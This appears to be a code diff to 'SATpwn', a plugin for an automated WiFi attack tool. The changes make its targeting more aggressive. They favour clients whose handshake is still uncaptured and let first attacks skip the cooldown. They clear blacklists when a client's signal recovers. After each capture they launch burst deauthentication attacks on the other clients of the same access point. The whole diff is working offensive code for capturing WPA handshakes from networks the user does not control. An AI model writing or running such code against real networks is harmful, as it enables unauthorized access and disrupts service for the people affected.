@@ -23,19 +23,16 @@ class SATpwn(plugins.Plugin):
     __license__ = 'GPL3'
     __description__ = 'SATpwn intelligent targeting system'
 
-    # Class constants - optimized for maximum aggression
     AP_EXPIRY_SECONDS = 3600 * 48
     CLIENT_EXPIRY_SECONDS = 3600 * 24
     ATTACK_SCORE_THRESHOLD = 20
     ATTACK_COOLDOWN_SECONDS = 90
-    SUCCESS_BONUS_DURATION_SECONDS = 1800
     SCORE_DECAY_PENALTY_PER_HOUR = 2
     PMKID_FRIENDLY_APS_THRESHOLD = 3
     PMKID_FRIENDLY_BOOST_FACTOR = 1.5
     HANDSHAKE_WEIGHT = 10
-    CLIENT_WEIGHT = 1
+    SIGNAL_QUALITY_WEIGHT = 2      # replaces raw CLIENT_WEIGHT; weights by signal quality
     SCORE_RECALCULATION_INTERVAL_SECONDS = 30
-    EXPLORATION_PROBABILITY = 0.1
     DRIVE_BY_AP_EXPIRY_SECONDS = 1800
     DRIVE_BY_CLIENT_EXPIRY_SECONDS = 900
     DRIVE_BY_ATTACK_SCORE_THRESHOLD = 5
@@ -50,11 +47,17 @@ class SATpwn(plugins.Plugin):
     EXECUTOR_MAX_WORKERS = 3
     MEMORY_SAVE_INTERVAL_SECONDS = 300
 
+    # Scoring bonuses / penalties
+    UNCAPTURED_BONUS = 25          # bonus for clients never yielding a handshake
+    RECENT_CAPTURE_WINDOW = 600    # seconds; within this window, recent captures are deprioritized
+    RECENT_CAPTURE_MULTIPLIER = 0.25
+
     MODE_PROFILES = {
-        'strict': 0.0, 'loose': 0.35, 'drive-by': 1.0, 'recon': 0.0, 'auto': 0.35
+        'strict': 0.3, 'loose': 0.6, 'drive-by': 1.0, 'recon': 0.0, 'auto': 0.5
     }
-    BLACKLIST_ATTEMPT_THRESHOLD = 10
+    BLACKLIST_ATTEMPT_THRESHOLD = 7
     BLACKLIST_DURATION_SECONDS = 7200
+    BLACKLIST_SIGNAL_RECOVERY_DB = 10  # dBm improvement that clears a blacklist
 
     def __init__(self):
         self.ready = False
@@ -315,17 +318,25 @@ class SATpwn(plugins.Plugin):
             self.memory_is_dirty = True
 
     def _recalculate_client_score(self, ap_mac, client_mac, now):
-        """Calculate client attack priority score with proper signal strength bounds."""
+        """Calculate client attack priority score prioritizing uncaptured targets."""
         client_data = self.memory[ap_mac]['clients'][client_mac]
 
-        score = max(0, min(100, client_data.get('signal', -100) + 100))
+        # Base: 0-100 from signal strength
+        score = max(0.0, min(100.0, client_data.get('signal', -100) + 100.0))
 
-        if client_data.get('last_success', 0) > now - self.SUCCESS_BONUS_DURATION_SECONDS:
-            score += 50
+        # Prioritize clients we've never captured a handshake from
+        last_success = client_data.get('last_success', 0)
+        if last_success == 0:
+            score += self.UNCAPTURED_BONUS
+        elif now - last_success < self.RECENT_CAPTURE_WINDOW:
+            # Just captured — deprioritize so we move on to new targets
+            score *= self.RECENT_CAPTURE_MULTIPLIER
 
+        # Age decay — penalize stale targets
         age_hours = (now - client_data.get('last_seen', now)) / 3600
         score = max(0.0, score - age_hours * self.SCORE_DECAY_PENALTY_PER_HOUR)
 
+        # RSSI trend: approaching clients get priority, departing get penalty
         history = client_data.get('rssi_history', [])
         if len(history) >= 2:
             score = max(0.0, score + max(-15.0, min(15.0, (history[-1] - history[0]) * 1.5)))
@@ -387,15 +398,21 @@ class SATpwn(plugins.Plugin):
     def _get_channel_stats(self):
         """Generate channel statistics for weighted hopping decisions."""
         channel_stats = {}
-        for ap_mac, ap_data in self.memory.items():
+        for ap_data in self.memory.values():
             ch = ap_data.get("channel")
-            if ch is None: 
+            if ch is None:
                 continue
             if ch not in channel_stats:
-                channel_stats[ch] = {'aps': 0, 'clients': 0, 'handshakes': 0}
+                channel_stats[ch] = {'aps': 0, 'signal_quality': 0.0,
+                                     'uncaptured': 0, 'handshakes': 0}
             channel_stats[ch]['aps'] += 1
-            channel_stats[ch]['clients'] += len(ap_data.get('clients', {}))
             channel_stats[ch]['handshakes'] += ap_data.get('handshakes', 0)
+            for cd in ap_data.get('clients', {}).values():
+                # Weight by signal quality (0–1) so weak distant clients don't inflate counts
+                quality = max(0.0, cd.get('signal', -100) + 100.0) / 100.0
+                channel_stats[ch]['signal_quality'] += quality
+                if cd.get('last_success', 0) == 0:
+                    channel_stats[ch]['uncaptured'] += 1
         return channel_stats
 
     def _channel_iterator(self, channels):
@@ -509,12 +526,19 @@ class SATpwn(plugins.Plugin):
                             }
                         else:
                             cd = ap_clients[client_mac]
+                            prev_rssi = cd.get('signal', -100)
                             cd['last_seen'] = now
                             cd['signal'] = new_rssi
                             history = cd.setdefault('rssi_history', [])
                             history.append(new_rssi)
                             if len(history) > 5:
                                 history.pop(0)
+                            # Clear blacklist if client reappears with significantly stronger signal
+                            if (cd.get('blacklist_until', 0) > now and
+                                    new_rssi > prev_rssi + self.BLACKLIST_SIGNAL_RECOVERY_DB):
+                                cd['blacklist_until'] = 0
+                                cd['attack_attempts'] = 0
+                                logging.debug(f"[SATpwn] Blacklist cleared (signal recovery): {client_mac}")
 
                         cd = ap_clients[client_mac]
 
@@ -528,28 +552,36 @@ class SATpwn(plugins.Plugin):
                         else:
                             score = cd.get('score', 0)
 
-                        if score >= threshold and now - cd.get('last_attempt', 0) > cooldown:
-                            pending_attacks.append((ap_mac, client_mac))
+                        if score < threshold:
+                            continue
+
+                        # First-ever attack skips cooldown — don't wait to discover new targets
+                        is_first = cd.get('attack_attempts', 0) == 0
+                        if is_first or now - cd.get('last_attempt', 0) > cooldown:
+                            pending_attacks.append((score, ap_mac, client_mac))
 
                 self._update_activity_history(new_ap_count, now)
                 self.memory_is_dirty = True
 
-            # Submit attacks outside the lock so threads don't contend on acquisition
+            # Submit attacks outside the lock, highest score first so limited thread slots
+            # go to the most valuable targets
             submode = self._current_submode
-            for ap_mac, client_mac in pending_attacks:
+            pending_attacks.sort(key=lambda x: x[0], reverse=True)
+            for _score, ap_mac, client_mac in pending_attacks:
                 self.executor.submit(self._execute_attack, agent, ap_mac, client_mac, submode)
 
         except Exception as e:
             logging.error(f"[SATpwn] WiFi update error: {e}")
 
     def on_handshake(self, agent, filename, ap, client):
-        """Track captured handshakes and update target scoring."""
+        """Track captured handshakes, update scoring, and burst-attack AP neighbors."""
         if not self.plugin_enabled:
             return
 
         try:
             ap_mac = ap['mac'].lower()
             client_mac = client['mac'].lower()
+            neighbor_targets = []
 
             with self._memory_lock:
                 if ap_mac in self.memory:
@@ -558,19 +590,34 @@ class SATpwn(plugins.Plugin):
                 if (ap_mac in self.memory and
                         client_mac in self.memory[ap_mac].get('clients', {})):
 
+                    t = time.time()
                     last_attempt = self.memory[ap_mac]['clients'][client_mac].get('last_attempt', 0)
-                    if time.time() - last_attempt < self.ATTACK_ATTRIBUTION_WINDOW_SECONDS:
+                    if t - last_attempt < self.ATTACK_ATTRIBUTION_WINDOW_SECONDS:
                         self.attack_success_count += 1
                         logging.info(f"[SATpwn] Success! {self.attack_success_count}/{self.attack_count}")
 
-                    t = time.time()
                     cd = self.memory[ap_mac]['clients'][client_mac]
                     cd['last_success'] = t
                     cd['blacklist_until'] = 0
                     cd['attack_attempts'] = 0
                     self._recalculate_client_score(ap_mac, client_mac, t)
 
+                    # Collect other uncaptured clients on same AP for immediate burst attack.
+                    # When one client deauths, others on the AP are also mid-reconnect —
+                    # this is the best window to capture their handshakes too.
+                    effective = self._current_submode if self.mode == 'auto' else self.mode
+                    if effective not in ('recon',):
+                        for other_mac, other_cd in self.memory[ap_mac]['clients'].items():
+                            if (other_mac != client_mac and
+                                    other_cd.get('last_success', 0) == 0 and
+                                    other_cd.get('blacklist_until', 0) < t):
+                                neighbor_targets.append(other_mac)
+
                 self.memory_is_dirty = True
+
+            submode = self._current_submode
+            for other_mac in neighbor_targets:
+                self.executor.submit(self._execute_attack, agent, ap_mac, other_mac, submode)
 
         except Exception as e:
             logging.error(f"[SATpwn] Handshake processing error: {e}")
@@ -586,12 +633,17 @@ class SATpwn(plugins.Plugin):
             agent.set_channel(random.choice(supported_channels))
             return
 
-        # Calculate channel weights based on activity
+        # Calculate channel weights: signal-quality-weighted clients + handshake history
+        # + uncaptured opportunity bonus
         weights = []
         for ch in channels:
-            stats = self.channel_stats.get(ch, {'clients': 0, 'handshakes': 0, 'aps': 0})
-            weight = (stats['clients'] * self.CLIENT_WEIGHT) + (stats['handshakes'] * self.HANDSHAKE_WEIGHT)
-            if stats['aps'] > self.PMKID_FRIENDLY_APS_THRESHOLD and stats['aps'] > stats['clients']:
+            stats = self.channel_stats.get(ch, {})
+            sq = stats.get('signal_quality', 0.0)
+            hs = stats.get('handshakes', 0)
+            uc = stats.get('uncaptured', 0)
+            aps = stats.get('aps', 0)
+            weight = (sq * self.SIGNAL_QUALITY_WEIGHT) + (hs * self.HANDSHAKE_WEIGHT) + uc
+            if aps > self.PMKID_FRIENDLY_APS_THRESHOLD and aps > sq:
                 weight *= self.PMKID_FRIENDLY_BOOST_FACTOR
             weights.append(weight)
 
